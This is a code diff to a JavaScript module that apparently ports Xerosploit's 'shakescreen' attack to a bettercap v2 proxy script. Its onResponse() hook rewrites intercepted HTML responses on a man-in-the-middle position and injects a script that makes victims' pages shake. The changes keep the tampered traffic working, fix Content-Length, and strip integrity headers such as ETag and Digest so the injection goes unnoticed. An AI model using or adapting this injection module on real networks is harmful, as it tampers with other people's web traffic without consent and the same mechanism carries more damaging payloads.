@@ -7,42 +7,34 @@
 //     window.onload=function(){var move=document.getElementsByTagName("body")[0];
 //       setInterval(function(){move.style.marginTop=(move.style.marginTop=="4px")?"-4px":"4px";},5);}
 //
-// Two usage modes are supported by this single file:
+// This file is a PURE bettercap v2 http.proxy.script module (loaded with
+// `set http.proxy.script <abs path>`).  It takes no parameters.  Its
+// onResponse() injects the shake snippet into every text/html response.
+// It is NOT a raw browser payload and must never be fed to bettercap's
+// built-in http.proxy.injectjs: doing so would inject this whole module --
+// hooks, helpers and all -- into the page.
 //
-//   1. As a bettercap proxy script (http.proxy.script): onResponse() injects
-//      the payload above into every text/html response.
-//        http_proxy(script=write_runtime_module("shakescreen.js", {}))
+// The injected snippet opens and closes a <script> tag in the OUTPUT, but this
+// module's SOURCE contains no literal script-closing tag (the closing tag is
+// written with an escaped slash) so it can never truncate an outer injected script.
 //
-//   2. As a raw bettercap built-in injectjs payload (http.proxy.injectjs), which
-//      is what PORT-SPEC section 5 documents:
-//        http_proxy(injectjs=script("shakescreen.js"))
-//      bettercap injects this file's contents into each page; the guarded
-//      top-level IIFE below then runs the shake logic directly in the page
-//      (it is inert when this file is evaluated inside bettercap itself, where
-//      `document`/`window` do not exist).
-//
-// Strict passthrough: anything that is not text/html is left untouched, and
-// any error is swallowed so proxied traffic is never broken.
+// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
+// "body modified" flag, so after the body has been read this module MUST write
+// a body back or bettercap emits an EMPTY response.  The decision to rewrite
+// is therefore made from method/status/headers alone; only then is the body
+// read exactly once.  Every exit path after that read sets the body and a
+// Content-Length equal to the UTF-8 byte length of the string it writes:
+// either the injected bytes, or the byte-exact original when the rewrite throws.
+// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
+// touched.  A response this module does not handle is left byte-identical.
 //
 // Released under the GNU GPLv3.
 // Original Xerosploit: LionSec / Neodrix.
+// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
 // ---------------------------------------------------------------------------
 
 var XE_MODULE_NAME = "shakescreen";
 
-// ---- mode 2: run immediately when injected as a raw payload into a page ---
-(function () {
-    if (typeof window === "undefined" || typeof document === "undefined") { return; }
-    window.onload = function () {
-        var body = document.getElementsByTagName("body")[0];
-        if (!body || !body.style) { return; }
-        setInterval(function () {
-            body.style.marginTop = (body.style.marginTop === "4px") ? "-4px" : "4px";
-        }, 5);
-    };
-})();
-
-// ---- mode 1: bettercap proxy script ---------------------------------------
 function xeLog(msg) {
     if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
 }
@@ -61,6 +53,55 @@ function xeByteLen(s) {
         else { n += 3; }
     }
     return n;
+}
+
+// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
+function xeGetHeader(headers, name) {
+    if (!headers) { return null; }
+    var want = ("" + name).toLowerCase();
+    var key;
+    for (key in headers) {
+        if (("" + key).toLowerCase() === want) {
+            var value = headers[key];
+            if (value === null || value === undefined) { return null; }
+            return value;
+        }
+    }
+    return null;
+}
+
+// Decide, from method/status/headers ALONE (no body read), whether this
+// response may be rewritten as a full-body 200.
+function xeSkipResponse(req, res) {
+    if (!req || req.Method !== "GET") { return true; }
+    if (!res || res.Status !== 200) { return true; }
+    if (xeGetHeader(req.Headers, "Range")) { return true; }
+    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
+    return false;
+}
+
+var XE_STALE_HEADERS = [
+    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
+    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
+];
+
+function xeWriteBody(res, body) {
+    res.Body = body;
+    if (typeof res.SetHeader === "function") {
+        res.SetHeader("Content-Length", "" + xeByteLen(body));
+    }
+}
+
+function xeReplaceBody(res, body, contentType) {
+    if (typeof res.RemoveHeader === "function") {
+        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
+            res.RemoveHeader(XE_STALE_HEADERS[i]);
+        }
+    }
+    if (contentType && typeof res.SetHeader === "function") {
+        res.SetHeader("Content-Type", contentType);
+    }
+    xeWriteBody(res, body);
 }
 
 function xeIsHtml(res) {
@@ -83,19 +124,8 @@ function xeInjectBeforeCloseTag(body, snippet) {
     return body + snippet;
 }
 
-function xeSetBody(res, body) {
-    res.Body = body;
-    if (typeof res.SetHeader === "function") {
-        res.SetHeader("Content-Length", "" + xeByteLen(body));
-    }
-    if (typeof res.RemoveHeader === "function") {
-        res.RemoveHeader("Content-Encoding");
-        res.RemoveHeader("Transfer-Encoding");
-    }
-}
-
-// The payload injected in mode 1 (identical logic to the IIFE above, written
-// as an inline script string so it can travel inside the HTML response).
+// The payload injected into the page.  Built with an escaped closing slash so
+// this module's source carries no literal script-closing tag.
 var XE_SHAKE_SNIPPET =
     "<script type=\"text/javascript\">" +
     "window.onload=function(){" +
@@ -103,24 +133,36 @@ var XE_SHAKE_SNIPPET =
     "setInterval(function(){" +
     "move.style.marginTop=(move.style.marginTop==\"4px\")?\"-4px\":\"4px\";" +
     "},5);};" +
-    "</script>";
+    "<\/script>";
 
 function onLoad() {
     xeLog("loaded");
 }
 
 function onResponse(req, res) {
+    // Decide from headers/URL only; a skipped response is never read or mutated.
+    if (!xeIsHtml(res)) { return; }
+    if (xeSkipResponse(req, res)) { return; }
+
+    // Committed to rewriting: read the body exactly once and always write back.
+    var original = null;
     try {
-        if (!xeIsHtml(res)) { return; }                                  // strict passthrough
+        original = xeReadBody(res);
+        if (typeof original !== "string") { return; }
 
-        var body = xeReadBody(res);
-        if (typeof body !== "string" || body.length === 0) { return; }
-
-        var where = (req && req.Host ? req.Host : "") + (req && req.Path ? req.Path : "");
+        var where = (req && req.Hostname ? req.Hostname : "") + (req && req.Path ? req.Path : "");
         xeLog("injecting shakescreen into " + where);
 
-        xeSetBody(res, xeInjectBeforeCloseTag(body, XE_SHAKE_SNIPPET));
+        var out = xeInjectBeforeCloseTag(original, XE_SHAKE_SNIPPET);
+        if (out !== original) {
+            xeReplaceBody(res, out, (typeof res.ContentType === "string" && res.ContentType) ? res.ContentType : "text/html");
+        } else {
+            xeWriteBody(res, original);
+        }
     } catch (e) {
-        xeWarn("onResponse failed: " + e);                               // never break traffic
+        xeWarn("onResponse failed: " + e);
+        if (typeof original === "string") {
+            xeWriteBody(res, original);                                  // fail-open: exact original bytes
+        }
     }
 }
